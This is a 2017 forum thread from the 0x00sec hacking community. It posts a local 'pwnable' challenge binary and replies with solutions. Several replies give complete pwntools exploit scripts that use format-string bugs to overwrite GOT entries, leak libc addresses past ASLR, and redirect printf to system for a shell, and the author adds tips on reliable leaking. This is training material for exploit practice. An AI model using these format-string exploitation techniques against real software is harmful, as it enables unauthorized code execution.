<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>[Pwnable] Do You Even Leak Bruh - Exploit Development - 0x00sec - The Home of the Hacker</title>
<meta name="description" content="Suh peeps! Another pwnable challenge! 

###Difficulty 
Easy, but could be debatable. 

###Objective 
Get a shell. 

###Rules 

ASLR should be turned on!
Since no libc is provided, all you have to do is pwn the binary loc&amp;hellip;">
<meta name="generator" content="Discourse 3.1.0.beta6 - https://github.com/discourse/discourse version 80a1709965fa59da824b2e3392976fc6fc898f80">
<link rel="icon" type="image/png" href="../../uploads/default/optimized/2X/3/30c4e7d76acf879a124fdfe4d8d126afe628c189_2_32x32.png">
<link rel="apple-touch-icon" type="image/png" href="../../uploads/default/optimized/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e_2_180x180.png">
<meta name="theme-color" media="all" content="#171616">
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, user-scalable=yes, viewport-fit=cover">
<link rel="canonical" href="3004.html" />
<link rel="search" type="application/opensearchdescription+xml" href="../../opensearch.xml" title="0x00sec - The Home of the Hacker Search">
<link href="../../stylesheets/color_definitions_0x00sec-v2_15_57_a5ef387651921c3e4c7aa1108536015ba8299efb.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" class="light-scheme" />
<link href="../../stylesheets/desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop" />
<link href="../../stylesheets/chat_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat" />
<link href="../../stylesheets/discourse-details_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-details" />
<link href="../../stylesheets/discourse-lazy-videos_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-lazy-videos" />
<link href="../../stylesheets/discourse-local-dates_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-local-dates" />
<link href="../../stylesheets/discourse-narrative-bot_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-narrative-bot" />
<link href="../../stylesheets/discourse-presence_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-presence" />
<link href="../../stylesheets/discourse-spoiler-alert_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="discourse-spoiler-alert" />
<link href="../../stylesheets/docker_manager_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="docker_manager" />
<link href="../../stylesheets/poll_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll" />
<link href="../../stylesheets/chat_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="chat_desktop" />
<link href="../../stylesheets/poll_desktop_87cd179c68f77a1d2535709c09116ecd05093b39.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="poll_desktop" />
<link href="../../stylesheets/desktop_theme_46_f36ade55bf80933494fe3b5fab518f477de3bd4e.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="46" data-theme-name="header links v2" />
<link href="../../stylesheets/desktop_theme_57_8c0e890a61cdb4c5833a9f9c96664ed164e7d645.css%3F__ws=0x00sec.org.css" media="all" rel="stylesheet" data-target="desktop_theme" data-theme-id="57" data-theme-name="0x00sec-v2" />
<link rel="stylesheet" href="https://s3.amazonaws.com/0x00sec/monokai-sublime.css">
<script src="https://s3.amazonaws.com/0x00sec/highlight.pack.js"></script>
<link rel="preload" href="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" as="script">
<script defer src="../../theme-javascripts/440fd21108f5ba9e5dfe06cca9fc842569d5a874.js%3F__ws=0x00sec.org" data-theme-id="40"></script>
<link rel="alternate nofollow" type="application/rss+xml" title="RSS feed of &#39;[Pwnable] Do You Even Leak Bruh&#39;" href="3004.rss" />
<meta property="og:site_name" content="0x00sec - The Home of the Hacker" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary_large_image" />
<meta name="twitter:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:image" content="https://0x00sec.org/uploads/default/original/2X/2/27a5373af868edade07624e8205c46e79c247445.jpeg" />
<meta property="og:url" content="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004" />
<meta name="twitter:url" content="https://0x00sec.org/t/pwnable-do-you-even-leak-bruh/3004" />
<meta property="og:title" content="[Pwnable] Do You Even Leak Bruh" />
<meta name="twitter:title" content="[Pwnable] Do You Even Leak Bruh" />
<meta property="og:description" content="Suh peeps! Another pwnable challenge!   ###Difficulty  Easy, but could be debatable.   ###Objective  Get a shell.   ###Rules   ASLR should be turned on! Since no libc is provided, all you have to do is pwn the binary locally. Full PoC is accepted as a solution. Just a screenshot of the shell doesn‚Äôt mean anything.   ###Binary  Since my demo isn‚Äôt always enough, big thanks to @exploit for making sure the binary is indeed exploitable.  pwn me   ~ gl &amp; hf" />
<meta name="twitter:description" content="Suh peeps! Another pwnable challenge!   ###Difficulty  Easy, but could be debatable.   ###Objective  Get a shell.   ###Rules   ASLR should be turned on! Since no libc is provided, all you have to do is pwn the binary locally. Full PoC is accepted as a solution. Just a screenshot of the shell doesn‚Äôt mean anything.   ###Binary  Since my demo isn‚Äôt always enough, big thanks to @exploit for making sure the binary is indeed exploitable.  pwn me   ~ gl &amp; hf" />
<meta property="og:article:section" content="Exploit Development" />
<meta property="og:article:section:color" content="92278F" />
<meta property="og:article:tag" content="linux" />
<meta property="og:article:tag" content="exploitation" />
<meta property="og:article:tag" content="binary" />
<meta property="og:article:tag" content="pwning" />
<meta name="twitter:label1" value="Reading time" />
<meta name="twitter:data1" value="2 mins üïë" />
<meta name="twitter:label2" value="Likes" />
<meta name="twitter:data2" value="35 ‚ù§" />
<meta property="article:published_time" content="2017-07-23T08:32:09+00:00" />
<meta property="og:ignore_canonical" content="true" />
</head>
<body class="crawler ">
<div id="top-navbar" class="container">
<span id="top-navbar-links" style="display:none;">

<a href="https://init.0x00sec.org" class="dow-menu">Init</a>
<a href="https://discord.gg/c6BHVfn" class="dow-menu">Discord</a>
<a href="https://init.0x00sec.org/?partners" class="dow-menu">Partners</a>
</span>
</div>
<header>
<a href="../../index.html">
0x00sec - The Home of the Hacker
</a>
</header>
<div id="main-outlet" class="wrap" role="main">
<div id="topic-title">
<h1>
<a href="3004.html">[Pwnable] Do You Even Leak Bruh</a>
</h1>
<div class="topic-category" itemscope itemtype="http://schema.org/BreadcrumbList">
<span itemprop="itemListElement" itemscope itemtype="http://schema.org/ListItem">
<a href="../../c/exploit-development.html" class="badge-wrapper bullet" itemprop="item">
<span class="badge-category-bg" style="background-color: #92278F"></span>
<span class="badge-category clear-badge">
<span class="category-name" itemprop="name">Exploit Development</span>
</span>
</a>
<meta itemprop="position" content="1" />
</span>
</div>
<div class="topic-category">
<div class="discourse-tags list-tags">
<a href="../../tag/linux.html" class="discourse-tag" rel="tag">linux</a>,
<a href="../../tag/exploitation.html" class="discourse-tag" rel="tag">exploitation</a>,
<a href="../../tag/binary.html" class="discourse-tag" rel="tag">binary</a>,
<a href="../../tag/pwning.html" class="discourse-tag" rel="tag">pwning</a>
</div>
</div>
</div>
<div itemscope itemtype="http://schema.org/DiscussionForumPosting">
<meta itemprop="headline" content="[Pwnable] Do You Even Leak Bruh">
<meta itemprop="articleSection" content="Exploit Development">
<meta itemprop="keywords" content="linux, exploitation, binary, pwning">
<div itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
<meta itemprop="name" content="0x00sec - The Home of the Hacker">
<div itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
<meta itemprop="url" content="https://0x00sec.org/uploads/default/original/2X/c/c5e37f667fd0fe006ffa67653c662fb64fec597e.png">
</div>
</div>
<div id="post_1" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3004.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-07-23T08:32:09Z" class="post-time">
July 23, 2017, 8:32am
</time>
<meta itemprop="dateModified" content="2017-08-17T17:35:42Z">
<span itemprop="position">1</span>
</span>
</div>
<div class="post" itemprop="articleBody">
<p>Suh peeps! Another pwnable challenge!</p>
<hr>
<p>###<em>Difficulty</em><br>
Easy, but could be debatable.</p>
<hr>
<p>###<em>Objective</em></p>
<p>Get a shell.</p>
<hr>
<p>###<em>Rules</em></p>
<ul>
<li>ASLR should be turned on!</li>
<li>Since no libc is provided, all you have to do is pwn the binary locally.</li>
<li>Full PoC is accepted as a solution. Just a screenshot of the shell doesn‚Äôt mean anything.</li>
</ul>
<hr>
<p>###<em>Binary</em></p>
<p>Since my demo isn‚Äôt always enough, big thanks to <a class="mention" href="https://0x00sec.org/u/exploit">@exploit</a> for making sure the binary is indeed exploitable.</p>
<p><a href="https://transfer.sh/cue7H/leakme" rel="nofollow noopener">pwn me</a></p>
<hr>
<p>~ gl &amp; hf</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="11" />
<span class="post-likes">11 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_2" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/mkhdznfq"><span itemprop="name">mkhdznfq</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3004.html">
<link itemprop="image" href="https://0x00sec.s3.amazonaws.com/original/2X/d/d51a0be3e56a04c0a392d8974ea09d18d09c1f72.png">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-07-23T17:56:11Z" class="post-time">
July 23, 2017, 5:56pm
</time>
<meta itemprop="dateModified" content="2017-07-23T17:56:11Z">
<span itemprop="position">2</span>
</span>
</div>
<div class="post" itemprop="text">
<p>thanks for the challenge <img src="../../images/emoji/twitter/thumbsup.png%3Fv=9" title=":thumbsup:" class="emoji" alt=":thumbsup:"> here‚Äôs my poc</p>
<div class="spoiler">
<pre><code class="lang-python">from pwn import *
context(arch='i386', os='linux')

# use libc-database to find offset
# ubuntu-xenial-i386-libc6 (id libc6_2.23-0ubuntu7_i386)
offset__IO_2_1_stdin_ = 0x001b25a0
offset_system = 0x0003ada0
diff = offset__IO_2_1_stdin_ - offset_system

# open the process
r = process("./leakme")
r.recvuntil('Do you even leak bruh?\n')

# create loop by replacing exit@got lower bytes with 0x8530
r.sendline("\x0c\x98\x04\x08%34092x%4$hn")
r.clean()

# leak _IO_2_1_stdin_ address
r.sendline("%2$p")
r.recvline()
_IO_2_1_stdin_ = int(r.recvline().strip(), 16)

# calculate system address
system = _IO_2_1_stdin_ - diff

# replace printf@got to system address
# break up into two writes (low &amp; high bytes)
hsys = (system &amp; 0xffff0000) &gt;&gt; 16 
lsys = system &amp; 0xffff
haddr = "\xfe\x97\x04\x08"
laddr = "\xfc\x97\x04\x08"
if lsys &gt; hsys: hsys, lsys, haddr, laddr = lsys, hsys, laddr, haddr
fmt = "{}{}%{}x%14$hn%{}x%15$hn".format(laddr, haddr, lsys - 8, hsys - lsys)

# get shell
r.sendline(fmt)
r.clean()
r.sendline("sh")
r.sendline("clear")
r.interactive()
</code></pre>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/d51a0be3e56a04c0a392d8974ea09d18d09c1f72.png" width="642" height="378"></p>
<p>yeah i know, it‚Äôs bad. i‚Äôm still trying to learn how to use pwntools the ‚Äúright way‚Äù <img src="../../images/emoji/twitter/slightly_smiling_face.png%3Fv=9" title=":slightly_smiling_face:" class="emoji" alt=":slightly_smiling_face:"></p>
</div>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_3" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3004.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-07-23T18:24:21Z" class="post-time">
July 23, 2017, 6:24pm
</time>
<meta itemprop="dateModified" content="2017-07-23T18:24:21Z">
<span itemprop="position">3</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/mkhdznfq">@mkhdznfq</a> Congrats! <img src="../../images/emoji/twitter/ok_hand.png%3Fv=9" title=":ok_hand:" class="emoji" alt=":ok_hand:"></p>
<p>Looks like you do leak bruh <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="4" />
<span class="post-likes">4 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_4" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/neolex"><span itemprop="name">neolex</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3004.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-07-24T18:20:37Z" class="post-time">
July 24, 2017, 6:20pm
</time>
<meta itemprop="dateModified" content="2017-07-24T18:20:37Z">
<span itemprop="position">4</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thank you for the challenge <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> !<br>
I need to practice a lot with pwn challenge i‚Äôm pretty noob at it , but I made it <img src="../../images/emoji/twitter/slight_smile.png%3Fv=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>[spoiler][code]#!/usr/bin/env python2</p>
<p>from pwn import *</p>
<p>EXIT_GOT = 0x0804980c<br>
PRINTF_GOT = 0x080497fc<br>
ENTRY_POINT = 0x8400<br>
SYSTEM_OFFSET = 0x0003c060<br>
_IO_2_1_stdin_offset = 0x001bd580</p>
<p>def overwrite(addr,number):<br>
payload = ‚Äú‚Äù<br>
payload += p32(addr)<br>
payload += ‚Äú%{}u|%4$hn‚Äù.format(number-5)<br>
p.sendline(payload)<br>
p.clean()</p>
<p>def double_overwrite(addr,number):<br>
towritel = (number &amp; 0xFFFF)<br>
towriteh = ((number &amp; 0xFFFF0000)&gt;&gt;16)</p>
<pre><code>payload = ""
payload += p32(addr)
payload += p32(addr+2)
payload += "%{}x|%4$hn".format(towritel-9)
payload += "%{}x|%5$hn".format(towriteh-towritel-1)
p.sendline(payload)
p.clean()
</code></pre>
<p>p = process("./leakme")<br>
pause()</p>
<h1>overwrite exit by entry point : loop</h1>
<p>overwrite(EXIT_GOT,ENTRY_POINT)</p>
<h1>leak</h1>
<p>p.sendline("%2$p")<br>
p.recvline()<br>
p.recvline()<br>
leaked=int(p.recvline().strip(), 16)<br>
print ‚ÄúLeaked address : ‚Äò{}‚Äô‚Äù.format(hex(leaked))</p>
<p>p.recvline()</p>
<h1>get libc base</h1>
<p>libc_base = leaked-_IO_2_1_stdin_offset<br>
print(‚ÄúLibc base : {}‚Äù.format(hex(libc_base)))</p>
<p>system =libc_base + SYSTEM_OFFSET<br>
print(‚Äúsystem : {}‚Äù.format(hex(system)))<br>
double_overwrite(PRINTF_GOT,system)<br>
p.sendline(‚Äúclear‚Äù)<br>
p.interactive()<br>
[/code]<br>
<a href="https://asciinema.org/a/JE08jLdGx9tY3FQtSLZZCrUmH" class="onebox" target="_blank" rel="nofollow noopener">https://asciinema.org/a/JE08jLdGx9tY3FQtSLZZCrUmH</a><br>
[/spoiler]</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_5" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3004.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-07-24T18:27:43Z" class="post-time">
July 24, 2017, 6:27pm
</time>
<meta itemprop="dateModified" content="2017-07-24T18:27:43Z">
<span itemprop="position">5</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Nicely done <a class="mention" href="https://0x00sec.org/u/neolex">@neolex</a>! <img src="../../images/emoji/twitter/muscle.png%3Fv=9" title=":muscle:" class="emoji" alt=":muscle:"> A small note to both <a class="mention" href="https://0x00sec.org/u/neolex">@neolex</a> and <a class="mention" href="https://0x00sec.org/u/mkhdznfq">@mkhdznfq</a>:</p>
<div class="spoiler">
<p>I noticed you found a libc address at the 2nd stack offset and used that in order to calculate the libc‚Äôs base address. You got lucky. As in, sometimes you may not find a libc address not even at the 200th offset, let alone be able to recognize which address you leaked. A more hybrid and safe way to leak is to use the %s format specifier on a GOT entry you placed yourself in your payload. That way, you‚Äôll always know which address you leaked and its offset inside libc (i.e fgets).</p>
</div>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="2" />
</div>
</div>
<div id="post_6" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/neolex"><span itemprop="name">neolex</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3004.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-07-24T18:55:13Z" class="post-time">
July 24, 2017, 6:55pm
</time>
<meta itemprop="dateModified" content="2017-07-24T18:55:13Z">
<span itemprop="position">6</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Thank you for the note <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> , I tried your way to leak and successed, here is my POC :</p>
<p>[spoiler][code]#!/usr/bin/env python2</p>
<p>from pwn import *</p>
<p>EXIT_GOT = 0x0804980c<br>
PUTS_GOT = 0x08049808<br>
PRINTF_GOT = 0x080497fc<br>
ENTRY_POINT = 0x8400<br>
PUTS_OFFSET = 0x00062710<br>
SYSTEM_OFFSET = 0x0003c060<br>
_IO_2_1_stdin_offset = 0x001bd580</p>
<p>def overwrite(addr,number):<br>
payload = ‚Äú‚Äù<br>
payload += p32(addr)<br>
payload += ‚Äú%{}u|%4$hn‚Äù.format(number-5)<br>
p.sendline(payload)<br>
p.clean()</p>
<p>def double_overwrite(addr,number):<br>
towritel = (number &amp; 0xFFFF)<br>
towriteh = ((number &amp; 0xFFFF0000)&gt;&gt;16)</p>
<pre><code>payload = ""
payload += p32(addr)
payload += p32(addr+2)
payload += "%{}x|%4$hn".format(towritel-9)
payload += "%{}x|%5$hn".format(towriteh-towritel-1)
p.sendline(payload)
p.clean()
</code></pre>
<p>p = process("./leakme")</p>
<h1>overwrite exit by entry point : loop</h1>
<p>overwrite(EXIT_GOT,ENTRY_POINT)</p>
<p>p.sendline(‚ÄúJUNK‚Äù)<br>
p.recv()</p>
<h1>leak with %s</h1>
<p>payload = p32(PUTS_GOT)<br>
payload += ‚Äú|%4$s|NEO‚Äù<br>
p.sendline(payload)<br>
leaked=u32(p.recvuntil("|NEO").split("|")[1])<br>
print ‚ÄúLeaked puts address : ‚Äò{}‚Äô‚Äù.format(hex(leaked))<br>
p.recvline()</p>
<h1>get libc base</h1>
<p>libc_base = leaked-PUTS_OFFSET<br>
print(‚ÄúLibc base : {}‚Äù.format(hex(libc_base)))</p>
<p>system =libc_base + SYSTEM_OFFSET<br>
print(‚Äúsystem : {}‚Äù.format(hex(system)))<br>
double_overwrite(PRINTF_GOT,system)<br>
p.sendline(‚Äúclear‚Äù)<br>
p.interactive()<br>
[/code][/spoiler]</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_7" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3004.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-07-24T19:04:21Z" class="post-time">
July 24, 2017, 7:04pm
</time>
<meta itemprop="dateModified" content="2017-07-24T19:04:21Z">
<span itemprop="position">7</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/neolex">@neolex</a> you‚Äôre on fire <img src="../../images/emoji/twitter/wink.png%3Fv=9" title=":wink:" class="emoji" alt=":wink:"> I hope you now understood how much more convenient that technique is.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="3" />
<span class="post-likes">3 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_8" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/neolex"><span itemprop="name">neolex</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3004.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-07-24T19:09:01Z" class="post-time">
July 24, 2017, 7:09pm
</time>
<meta itemprop="dateModified" content="2017-07-24T19:09:01Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Yes <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> thanks, just to be sure : it does‚Äônt work with exit‚Äôs or printf‚Äôs got address because exit is not called before i try to leak it ? So the address is not resolved ?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3004.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-07-24T19:13:28Z" class="post-time">
July 24, 2017, 7:13pm
</time>
<meta itemprop="dateModified" content="2017-07-24T21:24:15Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Exactly. If you try to leak exit‚Äôs address you‚Äôll notice its PLT stub code address. As for printf, it‚Äôs wise not to leak its address since it‚Äôs placed in weird areas in libc and sometimes you‚Äôll end up with a misaligned libc base, resulting to miscalculations of system‚Äôs address.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="2" />
<span class="post-likes">2 Likes</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_10" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/mkhdznfq"><span itemprop="name">mkhdznfq</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3004.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-07-25T03:52:13Z" class="post-time">
July 25, 2017, 3:52am
</time>
<meta itemprop="dateModified" content="2017-07-25T03:52:13Z">
<span itemprop="position">10</span>
</span>
</div>
<div class="post" itemprop="text">
<p>wow thanks <a class="mention" href="https://0x00sec.org/u/_py">@_py</a> for the note. never knew i could that <img src="../../images/emoji/twitter/joy.png%3Fv=9" title=":joy:" class="emoji" alt=":joy:"></p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/hkh4cks"><span itemprop="name">hkh4cks</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3004.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-07-26T11:42:15Z" class="post-time">
July 26, 2017, 11:42am
</time>
<meta itemprop="dateModified" content="2017-07-26T11:42:15Z">
<span itemprop="position">11</span>
</span>
</div>
<div class="post" itemprop="text">
<p><a class="mention" href="https://0x00sec.org/u/_py">@_py</a> are there any tutorials to learn it? I‚Äôm really interested in such problems. And also crack me problems‚Ä¶</p>
<p>Does it come under exploit development?</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_12" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/_py"><span itemprop="name">_py</span></a>
</span>
<link itemprop="mainEntityOfPage" href="3004.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2017-07-26T11:49:09Z" class="post-time">
July 26, 2017, 11:49am
</time>
<meta itemprop="dateModified" content="2017-07-26T11:49:09Z">
<span itemprop="position">12</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This has nothing to do with crackmes. This field is called exploit development. Though you need reverse engineering knowledge, exploit dev steps it up way more because you have to find bugs by reading assembly.</p>
